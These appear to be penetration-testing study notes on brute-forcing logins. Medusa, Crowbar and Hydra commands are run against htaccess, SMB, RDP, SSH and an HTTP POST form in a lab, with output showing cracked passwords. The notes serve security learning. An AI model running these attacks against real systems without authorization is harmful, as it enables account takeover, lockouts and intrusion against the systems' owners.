
*****NOTE:** PW attacks against network services can be noisy, and in some cases, dangerous.  
Logs & warnings, possibly lockout, etc.  
  

Depending on protocol & cracking tool, can increase login threads to boost speed.  
May not be possible due to protocol restrictions (ie: RDP & SMB)  
Auth negotiation for some protocols are more time-consuming (ie: RDP vs HTTP)  

Hidden art is choosing appropriate targets, user lists, & pw files before initiating the attack.  
  
Must match username & pw, AND honor the protocol involved in the auth process.  
  
**Tools:**  
  
[THC-Hydra](hydra.md)
[Medusa](medusa.md)
[Crowbar](crowbar.md) 

  
  
### HTTP htaccess Attack:

Setup:  
	Apache webserver installed on Win client (through XAMPP)  
	Attempt to gain access to protected folder **/admin**  
	Use wordlist _/usr/share/wordlists/rockyou.txt.gz_  
	Needs to be unzipped:  
```bash
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
```

```bash
medusa -h <vic_ip> -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/admin
```
.
	**-h** - Target hostname or IP  
	**-u** - Username to test  
	**-P** - File containing pws to test  
	**-M** - Name of module to execute (use **medusa** **-d** to show all available modules)  
	**-m** - Param to pass to the module  
  
  
\*\*Will output all results to screen.  
Might want to add:  
```bash
 | grep -i success
```


Ex of attacking SMB on Win client:  
```bash
cat pwlist  
freedom  
lab  
  
medusa -h 192.168.180.10 -u admin -P pwlist -M smbnt -f  
...  
ACCOUNT FOUND: [smbnt] Host: 192.168.180.10 User: admin Password: lab [SUCCESS (ADMIN$ - Access Allowed)]
```



### RDP Attack:

  
Setup:  
Install [crowbar](crowbar.md) on kali.  
  
Attack w/ **crowbar**:  
```bash
crowbar -b rdp -s 192.168.180.10/32 -u admin -C pwlist -n 1  
2023-01-13 09:46:17 START  
2023-01-13 09:46:17 Crowbar v0.4.2  
2023-01-13 09:46:17 Trying 192.168.180.10:3389  
2023-01-13 09:46:22 RDP-SUCCESS : 192.168.180.10:3389 - admin:lab  
2023-01-13 09:46:22 STOP
```
.
	**-b** - Target service  
	**-s** - Target --- (Must include CIDR notation)  
	**-u** - Target user  
	**-C** - PW file to use  
	**-n** - Number of active threads.  
	  
  
** RDP doesn't reliably handle multiple threads (hence **-n 1**)  

  
  
### SSH Attack:

```bash
hydra -l kali -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1
```


  
### HTTP POST Attack:

Setup:  
	Win Apache server (w/ xampp)  
  
  
Find arg reqs for http-form-post service:  
```bash
hydra http-form-post -U  
....  
Syntax:   <url>:<form parameters>:<condition string>[:<optional>[:<optional>]  
First is the page on the server to GET or POST to (URL).  
Second is the POST/GET variables (taken from either the browser, proxy, etc.  
 with url-encoded (resp. base64-encoded) usernames and passwords being replaced in the  
  "^USER^" (resp. "^USER64^") and "^PASS^" (resp. "^PASS64^") placeholders (FORM PARAMETERS)  
Third is the string that it checks for an *invalid* login (by default)  
  Invalid condition login check can be preceded by "F=", successful condition  
  login check must be preceded by "S=".  
  This is where most people get it wrong. You have to check the webapp what a  
  failed string looks like and put it in this parameter!  
...  
```


Discover IP address, URL of the web form, & inspect web form's code.  
  
**web form** - http://192.168.180.10/form/login.html -Discoverable w/ fuzzing(?)  
  
**source** -  
```html
<html>  
<title>  
Web Form Page  
</title>  
<body>  
This is a web form  
<form name="myForm" method="post" action="frontpage.php">  
<p>Login: <input type="text" name="user" /></p>  
<p>Password: <input type="password" name="pass" /></p>  
<p><input type="submit" name="Login" value="Login" /></p>  
</form>  
</body>  
</html>
```
	Indicates POST request is handled by _/form/frontpage.php_  
  
**url** - [http://192.168.180.10/form/frontpage.php](http://192.168.180.10/form/frontpage.php)  
  
**reqs** - user & pass  
	user=admin  
	pass=^PASS^ (acts as a placeholder for our wordlist file entries.  
  
**condition string** - Indicates when a login attempt is unsuccessful.  
	Attempt a few manual login attemps and use text returned from the web page:  
		INVALID LOGIN  

Giving us the completed code needed for **hydra**:  
```bash
hydra 192.168.180.10 http-form-post "/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f  
...  
[DATA] attacking http-post-form://192.168.180.10:80/form /frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN  
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done  
[ATTEMPT] target 192.168.180.10 - login "admin" - pass "123456" - 1 of 14344399 [child 0] (0/0)  
...  
[ATTEMPT] target 192.168.180.10 - login "admin" - pass "jessica" - 16 of 14344399 [child 15] (0/0)  
[80][http-post-form] host: 192.168.180.10   login: admin   password: crystal  
[STATUS] attack finished for 192.168.180.10 (valid pair found)  
1 of 1 target successfully completed, 1 valid password found  
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-01-13 10:33:36  
```
.
	**-l** - Login name  
	**-P** - Password list file  
	**-vV** - Very verbose  
	**-f** - Exit once pair is found  
  
Can use **F=INVALID LOGIN** or **S=**\<successful login text\>